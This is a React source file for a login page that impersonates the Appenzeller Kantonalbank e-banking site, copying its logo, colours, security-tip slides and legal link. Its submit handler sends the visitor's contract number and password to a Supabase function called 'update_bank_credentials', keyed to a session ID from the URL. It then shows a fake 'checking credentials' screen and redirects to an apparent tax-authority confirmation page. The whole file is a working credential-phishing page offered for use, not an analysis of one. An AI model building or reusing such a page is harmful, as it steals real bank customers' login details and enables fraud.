import { useState, useEffect, useRef } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff, ChevronLeft, ChevronRight } from "lucide-react";
import logoAsset from "@/assets/appenzeller-kantonalbank-logo.png.asset.json";
import browserverlaufAsset from "@/assets/akb-browserverlauf.jpg.asset.json";
import sicherheitAsset from "@/assets/akb-sicherheitshinweise.jpg.asset.json";

const RED = "#e30421";

const slides = [
  {
    image: browserverlaufAsset.url,
    title: "Browserverlauf regelmässig löschen",
    text: "Löschen Sie den Browserverlauf nach jedem Login ins E-Banking. Unter nachstehendem Link finden Sie eine Anleitung, wie Sie die...",
    linkText: "Mehr erfahren",
  },
  {
    image: sicherheitAsset.url,
    title: "Sicherheitshinweise",
    text: "Schützen Sie sich im Umgang mit dem Digital Banking.",
    linkText: "mehr erfahren",
  },
];

const ChAppenzellerKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [activeSlide, setActiveSlide] = useState(0);
  const touchStartX = useRef(0);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Appenzeller Kantonalbank – E-Banking", logoAsset.url);

  const nextSlide = () => setActiveSlide((s) => (s + 1) % slides.length);
  const prevSlide = () => setActiveSlide((s) => (s - 1 + slides.length) % slides.length);

  useEffect(() => {
    const id = setInterval(() => {
      setActiveSlide((s) => (s + 1) % slides.length);
    }, 5000);
    return () => clearInterval(id);
  }, []);

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/estv/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col bg-white">
        {/* Roter Top-Balken */}
        <div style={{ height: 6, backgroundColor: RED }} />

        <main className="flex-1 px-0 md:px-4">
          <div
            className="w-full md:max-w-[988px] mx-auto mt-0 md:mt-16 bg-white overflow-hidden md:shadow-sm md:rounded-lg md:aspect-[988/700] md:border md:border-[#d9d9d9]"
          >
            <div className="flex flex-col md:flex-row h-full">
              {/* Left column: header + form */}
              <div className="md:w-1/2 flex flex-col">
                {/* Header */}
                <div
                  className="flex items-center"
                  style={{ height: 40, paddingLeft: 24, paddingRight: 24 }}
                >
                  <img src={logoAsset.url} alt="Appenzeller Kantonalbank" className="h-[30px]" />
                </div>
                {/* Divider unter Logo: mobile 50/50 rot+grau, desktop vollrot */}
                <div className="flex h-[3px] md:hidden">
                  <div className="flex-1" style={{ backgroundColor: RED }} />
                  <div className="flex-1 bg-[#ddd]" />
                </div>
                <div className="hidden md:block" style={{ height: 3, backgroundColor: RED }} />

                {/* Form */}
                <div className="px-8 py-8 flex flex-col flex-1">
                  <h1 className="text-[22px] md:text-[26px] font-semibold text-black mb-2">Willkommen</h1>
                  <p className="text-[14px] mb-8" style={{ color: "#666" }}>
                    Melden Sie sich an, um fortzufahren.
                  </p>


                  <div className="mb-5">
                    <label className="block text-[13px] mb-1" style={{ color: "#555" }}>
                      Vertragsnummer
                    </label>
                    <input
                      type="text"
                      value={vertragsnummer}
                      onChange={(e) => setVertragsnummer(e.target.value)}
                      className="w-full px-3 py-2 border outline-none text-[15px] rounded-[5px] border-[#cccccc] hover:border-black focus:border-black transition-colors"
                      style={{ backgroundColor: "#fff" }}
                    />
                  </div>

                  <div className="mb-8">
                    <label className="block text-[13px] mb-1" style={{ color: "#555" }}>
                      Passwort
                    </label>
                    <div className="relative">
                      <input
                        type={showPassword ? "text" : "password"}
                        value={passwort}
                        onChange={(e) => setPasswort(e.target.value)}
                        className="w-full px-3 py-2 border outline-none text-[15px] pr-10 rounded-[5px] border-[#cccccc] hover:border-black focus:border-black transition-colors"
                        style={{ backgroundColor: "#fff" }}
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-2 top-1/2 -translate-y-1/2"
                        aria-label="Passwort anzeigen"
                      >
                        {showPassword ? (
                          <EyeOff size={18} color="#666" />
                        ) : (
                          <Eye size={18} color="#666" />
                        )}
                      </button>
                    </div>
                  </div>

                  <button
                    onClick={handleSubmit}
                    className="mx-auto w-full max-w-[140px] py-2.5 text-white font-semibold text-[15px] rounded-[3px]"
                    style={{ backgroundColor: RED }}
                  >
                    Weiter
                  </button>

                  <a
                    href="#"
                    className="mt-4 text-center text-[14px]"
                    style={{ color: RED }}
                  >
                    E-Banking und TWINT sperren
                  </a>

                  <div className="flex-1" />

                  <a
                    href="#"
                    className="mt-4 md:mt-10 text-center text-[14px]"
                    style={{ color: RED }}
                  >
                    Brauchen Sie Hilfe?
                  </a>
                </div>
              </div>

              {/* Right column: carousel */}
              <div className="md:w-1/2 flex flex-col">
                {/* top divider matching header height */}
                <div
                  className="hidden md:block"
                  style={{ height: 40, borderBottom: "2px solid #ddd" }}
                />


                <div
                  className="relative group flex-1 min-h-[360px] overflow-hidden"
                  onTouchStart={(e) => { touchStartX.current = e.touches[0].clientX; }}
                  onTouchEnd={(e) => {
                    const dx = e.changedTouches[0].clientX - touchStartX.current;
                    if (dx > 40) prevSlide();
                    else if (dx < -40) nextSlide();
                  }}
                >
                  {slides.map((s, i) => (
                    <img
                      key={i}
                      src={s.image}
                      alt={s.title}
                      className="absolute inset-0 w-full h-full object-cover transition-opacity duration-700"
                      style={{ opacity: i === activeSlide ? 1 : 0 }}
                    />
                  ))}

                  {/* Hover arrows (desktop only) */}
                  <button
                    onClick={prevSlide}
                    aria-label="Vorheriges Bild"
                    className="absolute left-3 top-1/2 -translate-y-1/2 w-10 h-10 rounded-full hidden md:flex items-center justify-center opacity-0 group-hover:opacity-100 transition"
                    style={{ backgroundColor: RED }}
                  >
                    <ChevronLeft size={22} color="#fff" />
                  </button>
                  <button
                    onClick={nextSlide}
                    aria-label="Nächstes Bild"
                    className="absolute right-3 top-1/2 -translate-y-1/2 w-10 h-10 rounded-full hidden md:flex items-center justify-center opacity-0 group-hover:opacity-100 transition"
                    style={{ backgroundColor: RED }}
                  >
                    <ChevronRight size={22} color="#fff" />
                  </button>


                  {/* Blur overlay with margin */}
                  <div
                    className="absolute left-4 right-4 bottom-4 px-5 py-4 backdrop-blur-md rounded-md"
                    style={{ backgroundColor: "rgba(245,245,245,0.55)" }}
                  >
                    <h3 className="font-bold text-[13px] mb-1" style={{ color: RED }}>
                      {slides[activeSlide].title}
                    </h3>
                    <p className="text-[13px] leading-snug mb-1" style={{ color: "#222" }}>
                      {slides[activeSlide].text}
                    </p>
                    <a href="#" className="text-[13px] hover:underline" style={{ color: RED }}>
                      {slides[activeSlide].linkText}
                    </a>

                    <div className="flex items-center justify-center gap-2 mt-3">
                      {slides.map((_, i) => (
                        <button
                          key={i}
                          onClick={() => setActiveSlide(i)}
                          aria-label={`Slide ${i + 1}`}
                          className="transition-all"
                          style={{
                            height: 4,
                            width: i === activeSlide ? 24 : 12,
                            backgroundColor: i === activeSlide ? "#fff" : "rgba(255,255,255,0.6)",
                          }}
                        />
                      ))}
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </main>

        {/* Footer */}
        <footer className="mt-0 md:mt-12" style={{ backgroundColor: "#353535" }}>
          <div
            className="max-w-[1100px] mx-auto px-8 py-4 text-[13px] flex flex-col items-center gap-1 md:flex-row md:justify-between md:flex-row-reverse"
            style={{ color: "#fff" }}
          >
            <a
              href="https://www.appkb.ch/ihre-appkb/services/rechtliche-hinweise"
              target="_blank"
              rel="noopener noreferrer"
              className="text-white hover:text-[#e30421] transition-colors"
            >
              Rechtliche Hinweise
            </a>
            <span>© Appenzeller Kantonalbank 2026</span>
          </div>
        </footer>
      </div>
    </>
  );
};

export default ChAppenzellerKantonalbank;
